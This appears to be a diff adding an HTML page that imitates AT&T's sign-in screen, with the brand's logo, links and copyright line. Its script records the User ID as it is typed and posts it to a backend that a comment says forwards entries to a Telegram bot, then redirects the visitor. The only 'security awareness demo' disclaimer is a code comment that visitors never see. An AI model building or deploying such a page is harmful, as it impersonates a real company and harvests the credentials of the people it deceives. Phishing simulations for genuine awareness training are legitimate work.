@@ -1,0 +1,122 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>AT&T Sign In Concept</title>
+    <link rel="stylesheet" href="index.css">
+    <!-- Clean Sans-Serif Font Setup -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Segoe+UI:wght@400;600;700&display=swap" rel="stylesheet">
+</head>
+<body>
+
+<div class="page-wrapper">
+    <!-- Main Sign-In Card -->
+    <div class="auth-card">
+        
+        <!-- Brand Header Layout -->
+        <div class="brand-header">
+            <!-- Inline SVG replacement placeholder for AT&T logo graphics -->
+            <svg class="att-logo" viewBox="0 0 24 24" fill="#0057B8">
+                <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 17.93c-3.95-.49-7-3.85-7-7.93 0-.62.08-1.21.21-1.79L12 15v4.93zm6.79-5.72c-.13.58-.33 1.14-.61 1.66L13 11V6.07c3.95.49 7 3.85 7 7.93 0 .73-.1 1.43-.21 2.21z"/>
+            </svg>
+            <span class="brand-text">AT&T</span>
+        </div>
+
+        <h1>Sign in <br><span class="sub-h1">to my Account</span></h1>
+
+        <!-- Form Layout Element -->
+        <form class="login-form" id="login-form">
+            <div class="input-container">
+                <label for="username">User ID</label>
+                <input type="text" id="username" required>
+            </div>
+
+            <button type="submit" class="btn btn-primary">Continue</button>
+        </form>
+
+        <!-- Contextual Help Links -->
+        <div class="links-container">
+            <a href="#" class="action-link text-bold">Forgot user ID?</a>
+            <a href="#" class="action-link text-bold">Don't have a user ID? Create one now</a>
+            <a href="#" class="action-link text-bold">Pay without signing in</a>
+        </div>
+
+        <!-- Section Break / Divider Line -->
+        <div class="separator-bar">
+            <span>OR</span>
+        </div>
+
+        <!-- Alternative Access Operations -->
+        <button type="button" class="btn btn-secondary">Sign in with the AT&T app</button>
+
+    </div>
+
+    <!-- Outer Page Utilities Footer Layout -->
+    <footer class="page-footer">
+        <div class="footer-nav">
+            <a href="#">Legal policy center</a>
+            <a href="#">Privacy policy</a>
+            <a href="#">Terms of use</a>
+            <a href="#">Accessibility</a>
+            <a href="#" class="privacy-choice">
+                <!-- Checkmark toggle style icon block -->
+                <svg viewBox="0 0 30 14" width="26" height="12" fill="none" style="vertical-align: middle; margin-right: 4px;">
+                    <rect width="30" height="14" rx="7" fill="#313131"/>
+                    <circle cx="7" cy="7" r="5" fill="#fff"/>
+                    <path d="M18 4l3 3 5-5" stroke="#fff" stroke-width="2"/>
+                </svg>
+                Your privacy choices
+            </a>
+            <a href="#">Screen share code</a>
+        </div>
+        <p class="copyright">©2026 AT&T Intellectual Property. All rights reserved.</p>
+    </footer>
+</div>
+
+<script>
+    // SECURITY AWARENESS DEMO — NOT AT&T
+    const loginForm = document.getElementById('login-form');
+    const usernameInput = document.getElementById('username');
+
+    // Store the User ID in real-time as the user types, so it's always available on the next page.
+    usernameInput.addEventListener('input', function () {
+        sessionStorage.setItem('att_username', usernameInput.value.trim());
+    });
+
+    loginForm.addEventListener('submit', async function (event) {
+        event.preventDefault();
+
+        const username = usernameInput.value.trim();
+        if (!username) {
+            alert('Please enter a User ID (use a fake one).');
+            return;
+        }
+
+        sessionStorage.setItem('att_username', username);
+
+        // Send the User ID entry step to the Telegram demo bot.
+        const submitBtn = document.querySelector('.btn-primary');
+        submitBtn.disabled = true;
+        submitBtn.textContent = 'Sending...';
+
+        try {
+            await fetch('http://localhost:8000/api/demo-submit', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ username: username, password: 'AT&T User ID entry step' })
+            });
+        } catch (err) {
+            // Backend unreachable — proceed anyway so the demo flow continues.
+            console.warn('Demo backend unreachable:', err);
+        }
+
+        // Also pass the username via the URL as a fallback for direct navigation.
+        window.location.href = 'welcome.html?username=' + encodeURIComponent(username);
+    });
+</script>
+
+</body>
+</html>
